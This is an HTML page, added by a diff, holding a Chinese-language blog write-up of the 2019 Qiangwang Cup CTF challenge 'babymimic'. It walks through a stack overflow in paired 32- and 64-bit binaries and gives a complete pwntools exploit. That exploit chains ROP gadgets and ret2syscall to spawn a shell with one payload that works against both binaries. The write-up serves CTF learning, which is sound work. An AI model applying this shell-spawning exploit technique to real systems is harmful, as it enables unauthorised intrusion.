@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019年强网杯 babymimic - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babymimic"><span class="toc-text">babymimic</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019年强网杯 babymimic
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-09-20 12:31:00</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="babymimic"><a href="#babymimic" class="headerlink" title="babymimic"></a>babymimic</h2><p>当时做这道题的时候是很惊讶的，给了两个文件，然后题目说是什么拟态防御，然后google一番并没有什么发现</p>
+<p>两个程序分别是同一份源码编译成32位和64位</p>
+<p>32位程序漏洞点：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  j_memset_ifunc(&amp;v1, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v1, <span class="number">0x300</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>64位程序漏洞点：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  j_memset_ifunc(&amp;buf, <span class="number">0L</span>L, <span class="number">256L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;buf, &amp;buf, v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>经过观察之后发现，32位溢出的偏移是0x110，而64位溢出的偏移是0x118，相差了8个字节</p>
+<p>题目要求是我们用同一个payload来打两个程序，并且要求两个程序的输出还是一样的</p>
+<p>当时我是停懵逼的，这32位和64位payload最起码地址的位数都不一样，怎么打啊（菜的一逼）</p>
+<p>然后赛后看WP，是利用溢出偏移差值来做文章。</p>
+<p>32位程序溢出后是从0x110字节开始执行<br>64位程序溢出后是从0x118字节开始执行</p>
+<p>我们可以利用对rsp的改变来控制对payload的执行位置</p>
+<p>我是这样构造payload：首先是32位程序的payload，然后跟着64位程序的payload</p>
+<p>在偏移0x118偏移处用<code>add rsp, 0x38 ; ret</code>抬高栈地址，然后去执行后面64位的payload</p>
+<p>而在0x110偏移处使用两个pop将<code>add rsp, 0x38 ; ret</code>的地址从栈中拿走，紧接着执行32位的payload就可以了</p>
+<p>getshell的方法就是先调用read函数在bss段上读入<code>/bin/sh\x00</code>，然后利用ret2syscall来getshell</p>
+<blockquote>
+<p>32位ret2syscall：rax：系统标号（11）；rbx：第一个参数；rcx：第二个参数；rdx：第三个参数；ret地址：int 80</p>
+</blockquote>
+<blockquote>
+<p>64位ret2syscall：rax：系统标号（59）；rdi：第一个参数；rsi：第二个参数；rdx：第三个参数；ret地址：syscall</p>
+</blockquote>
+<p>Exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = process(<span class="string">"./_stkof"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x80DA360</span></span><br><span class="line">r.recvuntil(<span class="string">"We give you a little challenge, try to pwn it?"</span>)</span><br><span class="line">offset = <span class="number">0x10c</span>+<span class="number">4</span></span><br><span class="line">pop_3_ret = <span class="number">0x08055f54</span><span class="comment">#pop eax ; pop edx ; pop ebx ; ret</span></span><br><span class="line">read_addr = <span class="number">0x806C8E0</span></span><br><span class="line">int_80_addr = <span class="number">0x080495a3</span></span><br><span class="line">syscall = <span class="number">0x0806166d</span></span><br><span class="line">pop_eax = <span class="number">0x080a8af6</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x0806e9f2</span> <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">pop_edx = <span class="number">0x0806e9cb</span><span class="comment">#pop edx ; ret</span></span><br><span class="line">main_addr = <span class="number">0x8048930</span></span><br><span class="line">ret = <span class="number">0x080481b2</span></span><br><span class="line">pay_32 = <span class="string">''</span></span><br><span class="line">pay_32 += p32(read_addr)</span><br><span class="line">pay_32 += p32(pop_3_ret)</span><br><span class="line">pay_32 += p32(<span class="number">0</span>)</span><br><span class="line">pay_32 += p32(binsh_addr)</span><br><span class="line">pay_32 += p32(<span class="number">9</span>)</span><br><span class="line">pay_32 += p32(pop_eax)</span><br><span class="line">pay_32 += p32(<span class="number">11</span>)</span><br><span class="line">pay_32 += p32(pop_ecx_ebx)</span><br><span class="line">pay_32 += p32(<span class="number">0</span>)</span><br><span class="line">pay_32 += p32(<span class="number">0x80DA360</span>)</span><br><span class="line">pay_32 += p32(pop_edx)</span><br><span class="line">pay_32 += p32(<span class="number">0</span>)</span><br><span class="line">pay_32 += p32(int_80_addr)</span><br><span class="line"></span><br><span class="line">pop_rdi_64 = <span class="number">0x00000000004005f6</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_64 = <span class="number">0x0000000000405895</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx_64 = <span class="number">0x000000000043b9d5</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">read_addr_64 = <span class="number">0x00000000043B9C0</span></span><br><span class="line">int_80_addr_64 = <span class="number">0x000000000044e82c</span></span><br><span class="line">binsh_addr_64 = <span class="number">0x06A3320</span></span><br><span class="line">offset_64 = <span class="number">0x110</span>+<span class="number">8</span></span><br><span class="line">main_64 = <span class="number">0x000000000400B34</span></span><br><span class="line">syscall_64 = <span class="number">0x000000000046713f</span></span><br><span class="line">pop_rax_64 = <span class="number">0x000000000043b97c</span></span><br><span class="line">pay_64=<span class="string">''</span></span><br><span class="line">pay_64+= p64(pop_rdi_64)</span><br><span class="line">pay_64+= p64(<span class="number">0</span>)</span><br><span class="line">pay_64+= p64(pop_rsi_64)</span><br><span class="line">pay_64+= p64(binsh_addr_64)</span><br><span class="line">pay_64+= p64(pop_rdx_64)</span><br><span class="line">pay_64+= p64(<span class="number">9</span>)</span><br><span class="line">pay_64+= p64(read_addr_64)</span><br><span class="line">pay_64+= p64(pop_rax_64)</span><br><span class="line">pay_64+= p64(<span class="number">59</span>)</span><br><span class="line">pay_64+= p64(pop_rdi_64)</span><br><span class="line">pay_64+= p64(binsh_addr_64)</span><br><span class="line">pay_64+= p64(pop_rsi_64)</span><br><span class="line">pay_64+= p64(<span class="number">0</span>)</span><br><span class="line">pay_64+= p64(pop_rdx_64)</span><br><span class="line">pay_64+= p64(<span class="number">0</span>)</span><br><span class="line">pay_64+= p64(syscall_64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print "---------------",len(pay_32)#0x34</span></span><br><span class="line"><span class="comment"># gdb.attach(r,"b *0x0000000000461f85")</span></span><br><span class="line">rsp_64 = <span class="number">0x0000000000461f85</span> <span class="comment"># add rsp, 0x38 ; ret</span></span><br><span class="line">pay = <span class="string">"\x00"</span>*offset+p32(ret)+p32(pop_ecx_ebx)+p64(rsp_64)+pay_32+p32(<span class="number">0</span>)+pay_64</span><br><span class="line">r.send(pay.ljust(<span class="number">0x300</span>,<span class="string">"\x00"</span>))</span><br><span class="line">r.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
